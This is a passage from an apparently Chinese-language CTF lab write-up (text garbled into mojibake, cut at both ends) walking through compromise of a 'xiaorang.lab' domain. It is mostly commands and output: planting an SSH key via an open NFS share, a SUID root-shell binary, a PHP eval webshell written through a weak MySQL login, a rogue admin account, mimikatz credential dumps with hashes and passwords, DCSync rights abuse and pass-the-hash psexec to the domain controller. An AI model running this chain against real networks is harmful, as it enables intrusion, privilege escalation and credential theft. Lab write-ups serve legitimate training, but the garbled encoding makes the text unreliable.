[SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.14       çŠ¶æ€ç : 200 é•¿åº¦: 10918  æ ‡é¢˜: Apache2 Ubuntu Default Page: It works\n[2025-04-27 16:01:01] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.13.28\nä¸»æœºå: WIN-HAUWOLAO\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4 åœ°å€:\n      â””â”€ 172.22.13.28\n[2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393\n[2025-04-27 16:01:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.14:8080  çŠ¶æ€ç : 200 é•¿åº¦: 3655   æ ‡é¢˜: å…¬å¸å‘è´§å•\n[2025-04-27 16:01:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.28:8000  çŠ¶æ€ç : 200 é•¿åº¦: 170    æ ‡é¢˜: Nothing Here.\n~~~\n\né¢˜ç›®æç¤ºäº†è¦æ‰“ NFSï¼Œå…ˆæ‰«ä¸€ä¸‹ 2049 çš„ç«¯å£\n\n~~~\nroot@ubuntu:~# ./fscan2 -h 172.22.13.14/24 -p 2049\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    â”‚\nâ”‚  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-27 16:07:15] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-27 16:07:15] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-27 16:07:15] [INFO] CIDR èŒƒå›´: 172.22.13.0-172.22.13.255\n[2025-04-27 16:07:15] [INFO] ç”Ÿæˆ IP èŒƒå›´: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)\n[2025-04-27 16:07:16] [INFO] è§£æ CIDR 172.22.13.14/24 -> IP èŒƒå›´ 172.22.13.0-172.22.13.255\n[2025-04-27 16:07:16] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-04-27 16:07:16] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-27 16:07:16] [SUCCESS] ç›®æ ‡ 172.22.13.6     å­˜æ´» (ICMP)\n[2025-04-27 16:07:16] [SUCCESS] ç›®æ ‡ 172.22.13.14    å­˜æ´» (ICMP)\n[2025-04-27 16:07:16] [SUCCESS] ç›®æ ‡ 172.22.13.28    å­˜æ´» (ICMP)\n[2025-04-27 16:07:16] [SUCCESS] ç›®æ ‡ 172.22.13.57    å­˜æ´» (ICMP)\n[2025-04-27 16:07:19] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4\n[2025-04-27 16:07:19] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 1\n[2025-04-27 16:07:19] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.57:2049\n~~~\n\n172.22.13.57 å¼€äº† 2049 çš„ç«¯å£\n\n~~~\n#åœ¨é¶æœºä¸Šæ“ä½œ\nroot@ubuntu:~# showmount -e 172.22.13.57\nExport list for 172.22.13.57:\n/home/joyce *\nroot@ubuntu:~# cd /tmp\nroot@ubuntu:/tmp# mkdir test\nroot@ubuntu:/tmp# mount -t nfs 172.22.13.57:/ ./test -o nolock\n~~~\n\nç„¶å joyce çš„å®¶ç›®å½•å°±è¢«æˆåŠŸæŒ‚è½½äº†ï¼Œå†™ä¸€ä¸ªå…¬é’¥è¿›å»\n\n~~~\nroot@ubuntu:/tmp/test/home/joyce# mkdir .ssh\nroot@ubuntu:/tmp/test/home/joyce# cd .ssh\nroot@ubuntu:/tmp/test/home/joyce/.ssh# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJcatU49PfwyMAfrfJcaaIFCNOJNWOdDonEg3ahNxG8H root@kali'> authorized_keys\n~~~\n\nç„¶å ssh è¿æ¥\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/123]\nâ””â”€# proxy -f proxychains4.conf ssh joyce@172.22.13.57\n[proxychains] config file found: proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.22.13.57:22  ...  OK\nThe authenticity of host '172.22.13.57 (172.22.13.57)' can't be established.\nED25519 key fingerprint is SHA256: Y8qbRlvlJKReDyk1mEsy/A7aQosNyeucM/GZs7aI8SA.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '172.22.13.57' (ED25519) to the list of known hosts.\nLast login: Thu Aug 11 18:16:01 2022\n\nWelcome to Alibaba Cloud Elastic Compute Service !\n\n[joyce@centos ~]$ ls\n[joyce@centos ~]$ ls -al\ntotal 28\ndrwx------  3 joyce joyce 4096 Apr 27 16:11 .\ndrwxr-xr-x. 4 root  root  4096 Aug 10  2022 ..\n-rw-------  1 joyce joyce    5 Aug 11  2022 .bash_history\n-rw-r--r--  1 joyce joyce   18 Nov 25  2021 .bash_logout\n-rw-r--r--  1 joyce joyce  193 Nov 25  2021 .bash_profile\n-rw-r--r--  1 joyce joyce  231 Nov 25  2021 .bashrc\ndrwxr-xr-x  2 root  root  4096 Apr 27 16:12 .ssh\n[joyce@centos ~]$\n~~~\n\nå°è¯•ææƒï¼ŒæŸ¥æ‰¾ suid æƒé™\n\n~~~\n[joyce@centos ~]$ find / -perm -u = s 2 >/dev/null\n/usr/libexec/dbus-1/dbus-daemon-launch-helper\n/usr/sbin/unix_chkpwd\n/usr/sbin/pam_timestamp_check\n/usr/sbin/usernetctl\n/usr/sbin/mount.nfs\n/usr/bin/sudo\n/usr/bin/chage\n/usr/bin/at\n/usr/bin/mount\n/usr/bin/crontab\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/ftp\n/usr/bin/umount\n/usr/lib/polkit-1/polkit-agent-helper-1\n~~~\n\nftp ææƒå¯ä»¥è¯»æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ nfs ä¸Šä¼ ä¸€ä¸ªæ¶æ„æ–‡ä»¶æ‹¿åˆ° shell\n\n~~~\nroot@ubuntu:/tmp# echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > root.c\nroot@ubuntu:/tmp# gcc root.c -o root\nroot.c: In function â€˜mainâ€™:\nroot.c: 1:14: warning: implicit declaration of function â€˜setgidâ€™ [-Wimplicit-function-declaration]\n    1 | int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }\n      |              ^~~~~~\nroot.c: 1:25: warning: implicit declaration of function â€˜setuidâ€™ [-Wimplicit-function-declaration]\n    1 | int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }\n      |                         ^~~~~~\nroot.c: 1:36: warning: implicit declaration of function â€˜systemâ€™ [-Wimplicit-function-declaration]\n    1 | int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }\n      |\nroot@ubuntu:/tmp# chmod +s ./root\nroot@ubuntu:/tmp# mv root ./test/home/joyce/\n~~~\n\n~~~\n[joyce@centos ~]$ ls\nroot\n[joyce@centos ~]$ ./root\n[root@centos ~]# id\nuid = 0(root) gid = 0(root) groups = 0(root),994(joyce)\n~~~\n\nflag02 åœ¨æ ¹ç›®å½•ä¸‹\n\n# FLAG03\n\n 172.22.13.28 æ˜¯ä¸€ä¸ª OA ç³»ç»Ÿï¼Œç”¨ fscan æ‰«ä¸€ä¸‹å…¨ç«¯å£ï¼Œå¯ä»¥æ‰«åˆ° mysql æœ‰å¼±å£ä»¤\n\n~~~\nroot: 123456\n~~~\n\nnavicat è¿æ¥\n\n~~~\nmysql > show variables like \"secure_file_priv\";\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv |       |\n+------------------+-------+\n1 row in set (0.05 sec)\nmysql > show variables like \"%general%\";\n+------------------+--------------------------------------------------------------+\n| Variable_name    | Value                                                        |\n+------------------+--------------------------------------------------------------+\n| general_log      | OFF                                                          |\n| general_log_file | C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\WIN-HAUWOLAO.log |\n+------------------+--------------------------------------------------------------+\n2 rows in set (0.06 sec)\n~~~\n\nå°è¯•å†™é©¬\n\n~~~\nmysql > select \"<?php eval($_POST[1]);?>\" into outfile \"C:/phpstudy_pro/WWW/1.php\";\nQuery OK, 1 row affected (0.03 sec)\n~~~\n\nç„¶åèšå‰‘è¿æ¥ï¼Œflag03 åœ¨ C:/Users/Administrator/flag/ä¸‹\n\n# FLAG04\n\nåˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œæ·»åŠ è¿›ç”¨æˆ·ç»„é‡Œ\n\n~~~\nC:\\Users\\Administrator\\flag > net user lv Asd123123 /add\nå‘½ä»¤æˆåŠŸå®Œæˆã€‚\n \nC:\\Users\\Administrator\\flag > net localgroup administrators lv /add\nå‘½ä»¤æˆåŠŸå®Œæˆã€‚\n~~~\n\nç„¶åè¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œä¸Šä¼ ä¸€ä¸ª mimikatz æŠ“å–å“ˆå¸Œ\n\n~~~\n\n  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz # privilege:: debug\nPrivilege '20' OK\n\nmimikatz # log\nUsing 'mimikatz.log' for logfile : OK\n\nmimikatz # sekurlsa:: logonpasswords\n\nAuthentication Id : 0 ; 11159151 (00000000:00aa466f)\nSession           : RemoteInteractive from 2\nUser Name         : lv\nDomain            : WIN-HAUWOLAO\nLogon Server      : WIN-HAUWOLAO\nLogon Time        : 2025/4/27 16:53:43\nSID               : S-1-5-21-2057596273-973658165-3030246172-1000\n        msv :\n         [00000003] Primary\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * NTLM     : 85edf6aacad2ac8e2a7a44741eb0b236\n         * SHA1     : aab02ea07aee541e9f60a1f6d5a54a2045965743\n        tspkg :\n        wdigest :\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * Password : (null)\n        kerberos :\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 11136230 (00000000:00a9ece6)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/4/27 16:53:43\nSID               : S-1-5-90-0-2\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : xiaorang.lab\n         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 11136190 (00000000:00a9ecbe)\nSession           : Interactive from 2\nUser Name         : DWM-2\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/4/27 16:53:43\nSID               : S-1-5-90-0-2\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : xiaorang.lab\n         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 91296 (00000000:000164a0)\nSession           : Service from 0\nUser Name         : chenglei\nDomain            : XIAORANG\nLogon Server      : WIN-DC\nLogon Time        : 2025/4/27 15:43:55\nSID               : S-1-5-21-3269458654-3569381900-10559451-1105\n        msv :\n         [00000003] Primary\n         * Username : chenglei\n         * Domain   : XIAORANG\n         * NTLM     : 0c00801c30594a1b8eaa889d237c5382\n         * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7\n         * DPAPI    : 89b179dc738db098372c365602b7b0f4\n        tspkg :\n        wdigest :\n         * Username : chenglei\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : chenglei\n         * Domain   : XIAORANG.LAB\n         * Password : Xt61f3LBhg1\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 53263 (00000000:0000d00f)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:53\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : b5cd3591a58e1169186bcdbfd4b6322d\n         * SHA1     : 226ee6b5e527e5903988f08993a2456e3297ee1f\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : xiaorang.lab\n         * Password : `k+hcEDFvtzoObj=>DvzxiNqwyEn;Eu-\\zFVAh>.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB'LLG6wSx6TR%m;` Nfr;; Hf8O'Szfl0Z = w+^,> 0jR\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : WIN-HAUWOLAO$\nDomain            : XIAORANG\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:53\nSID               : S-1-5-20\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : win-hauwolao$\n         * Domain   : XIAORANG.LAB\n         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 24185 (00000000:00005e79)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:52\nSID               :\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n        kerberos :\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 11159180 (00000000:00aa468c)\nSession           : RemoteInteractive from 2\nUser Name         : lv\nDomain            : WIN-HAUWOLAO\nLogon Server      : WIN-HAUWOLAO\nLogon Time        : 2025/4/27 16:53:43\nSID               : S-1-5-21-2057596273-973658165-3030246172-1000\n        msv :\n         [00000003] Primary\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * NTLM     : 85edf6aacad2ac8e2a7a44741eb0b236\n         * SHA1     : aab02ea07aee541e9f60a1f6d5a54a2045965743\n        tspkg :\n        wdigest :\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * Password : (null)\n        kerberos :\n         * Username : lv\n         * Domain   : WIN-HAUWOLAO\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 91297 (00000000:000164a1)\nSession           : Service from 0\nUser Name         : chenglei\nDomain            : XIAORANG\nLogon Server      : WIN-DC\nLogon Time        : 2025/4/27 15:43:55\nSID               : S-1-5-21-3269458654-3569381900-10559451-1105\n        msv :\n         [00000003] Primary\n         * Username : chenglei\n         * Domain   : XIAORANG\n         * NTLM     : 0c00801c30594a1b8eaa889d237c5382\n         * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7\n         * DPAPI    : 89b179dc738db098372c365602b7b0f4\n        tspkg :\n        wdigest :\n         * Username : chenglei\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : chenglei\n         * Domain   : XIAORANG.LAB\n         * Password : Xt61f3LBhg1\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:53\nSID               : S-1-5-19\n        msv :\n        tspkg :\n        wdigest :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        kerberos :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 53235 (00000000:0000cff3)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:53\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * NTLM     : 00f24a2e0e0076b23f55b10e54d4cc25\n         * SHA1     : 8c03f31f89359af762fe0f271a0d61a64ef6eca1\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : xiaorang.lab\n         * Password : 18 81 7a 3c 1c ec 03 ec 71 bd fd a6 5f c7 1d d8 be 20 8f e4 e2 f2 96 d1 01 1a 88 7f 4c 07 89 bd 00 45 80 3d b0 61 e5 73 be e2 b4 01 9b 14 88 64 e7 ad 83 83 65 0a 53 40 9f 44 a9 90 b2 aa 04 c7 e1 23 f5 dd 3e f4 5d b3 13 88 9e 67 1f 0a 8a 18 5f dd 82 d2 f0 e1 41 5d 12 6f 8f bb 44 05 66 8d 10 40 e2 5d 97 c8 48 ea 5d 74 d8 7b 5b 1a 5f 9e 94 3a 21 01 c7 9f a5 c9 79 3c 70 91 4c 52 4e 69 ce f6 fe 0f db 54 2a 7c 3c 3a 71 99 2a a9 3e 3d 4e 06 b1 b7 8d 11 a7 7b 71 5a 7d 8c f3 cb 2b f7 c0 eb 74 64 e7 c7 f0 32 36 d0 03 1f f2 69 25 52 5f 18 05 0e 66 1f 82 b4 a7 99 11 c7 64 b5 78 05 c1 91 94 f7 16 8c d0 04 7e 0f e3 2b 7c 83 af 3d d9 46 fd da d8 cd 5c af 89 cd 93 78 14 68 f5 e4 71 55 0f a1 7d c6 9e f6 7f 0c 5d 62 f6 33 5b 12\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : WIN-HAUWOLAO$\nDomain            : XIAORANG\nLogon Server      : (null)\nLogon Time        : 2025/4/27 15:43:52\nSID               : S-1-5-18\n        msv :\n        tspkg :\n        wdigest :\n         * Username : WIN-HAUWOLAO$\n         * Domain   : XIAORANG\n         * Password : (null)\n        kerberos :\n         * Username : win-hauwolao$\n         * Domain   : XIAORANG.LAB\n         * Password : (null)\n        ssp :\n        credman :\n\nmimikatz # \\\n~~~\n\næ‹¿åˆ°äº†ä¸€ä¸ªåŸŸå†…ç”¨æˆ· `chenglei`ï¼ŒæŸ¥çœ‹ chenglei çš„åŸŸå†…æƒé™\n\n~~~\nC:\\Users\\Administrator\\flag > net user chenglei /domain\nè¿™é¡¹è¯·æ±‚å°†åœ¨åŸŸ xiaorang.lab çš„åŸŸæ§åˆ¶å™¨å¤„ç†ã€‚\nç”¨æˆ·å                 chenglei\nå…¨å                   \næ³¨é‡Š                   \nç”¨æˆ·çš„æ³¨é‡Š             \nå›½å®¶/åœ°åŒºä»£ç           000 (ç³»ç»Ÿé»˜è®¤å€¼)\nå¸æˆ·å¯ç”¨               Yes\nå¸æˆ·åˆ°æœŸ               ä»ä¸\nä¸Šæ¬¡è®¾ç½®å¯†ç            2023/7/11 14:57:52\nå¯†ç åˆ°æœŸ               ä»ä¸\nå¯†ç å¯æ›´æ”¹             2023/7/12 14:57:52\néœ€è¦å¯†ç                Yes\nç”¨æˆ·å¯ä»¥æ›´æ”¹å¯†ç        Yes\nå…è®¸çš„å·¥ä½œç«™           All\nç™»å½•è„šæœ¬               \nç”¨æˆ·é…ç½®æ–‡ä»¶           \nä¸»ç›®å½•                 \nä¸Šæ¬¡ç™»å½•               2025/4/27 16:57:57\nå¯å…è®¸çš„ç™»å½•å°æ—¶æ•°     All\næœ¬åœ°ç»„æˆå‘˜             \nå…¨å±€ç»„æˆå‘˜             *ACL Admin            * Domain Users         \nå‘½ä»¤æˆåŠŸå®Œæˆã€‚\n~~~\n\nå±äº ACL Admin ç»„ï¼Œè¿™ä¸ªç»„æœ‰ WriteDACL çš„æƒé™ï¼Œç»™ chenglei å»æ·»åŠ  DCSync æƒé™\n\n```\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/123]\nâ””â”€# bloodyAD --host 172.22.13.6 -d \"XIAORANG.LAB\" -u chenglei -p Xt61f3LBhg1 add dcsync \"chenglei\"\n[+] chenglei is now able to DCSync\n```\n\nç„¶åç”¨ chenglei è¿œç¨‹ç™»å½• mimikatz æŠ“å–åŸŸå†…å“ˆå¸Œ\n\n~~~\nmimikatz # lsadump:: dcsync /domian: xiaorang.lab /all /csv\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'WIN-DC.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n1104    zhangwen        fa7d776fdfc82d3f43c9d8b7f5312d77        512\n502     krbtgt  cb976ec1a1bf8a14a15142c6fecc540e        514\n1106    zhangtao        e786c4a4987ced162c496d0519496729        512\n1000    WIN-DC$ 5a5c8ad1abcec444c534563d7db5c332        532480\n500     Administrator   6341235defdaed66fb7b682665752c9a        512\n1105    chenglei        0c00801c30594a1b8eaa889d237c5382        512\n1103    WIN-HAUWOLAO$   00f24a2e0e0076b23f55b10e54d4cc25        4096\n~~~\n\nç„¶åæ¨ªå‘å°±è¡Œäº†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/123]\nâ””â”€# impacket-psexec  -hashes : 6341235defdaed66fb7b682665752c9a Administrator@172.22.13.6\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 172.22.13.6.....\n[*] Found writable share ADMIN$\n[*] Uploading file hUqShSba.exe\n[*] Opening SVCManager on 172.22.13.6.....\n[*] Creating service PuTe on 172.22.13.6.....\n[*] Starting service PuTe.....\n[!] Press help for extra shell commands\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\nMicrosoft Windows [ï¿½ æ±¾ 10.0.20348.1787]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\n(c) Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½\n\n\nC:\\Windows\\system32 >\n~~~\n\nflag4 åœ¨ C:\\Users\\Administrator\\flag ä¸‹\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"HackmyVM-Driftingblues9","url":"/2025/04/24/HackmyVM-Driftingblues9/","content":"\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:70:2e:5f       PCS Systemtechnik GmbH\n192.168.31.159  08:00:27:b3:1b:96       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.159å°±æ˜¯é¶æœº\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.159 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 02:36 EDT\nNmap scan report for 192.168.31.159\nHost is up (0.0013s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT      STATE SERVICE\n80/tcp    open  http\n111/tcp   open  rpcbind\n41157/tcp open  unknown\nMAC Address: 08:00:27:B3:1B:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.08 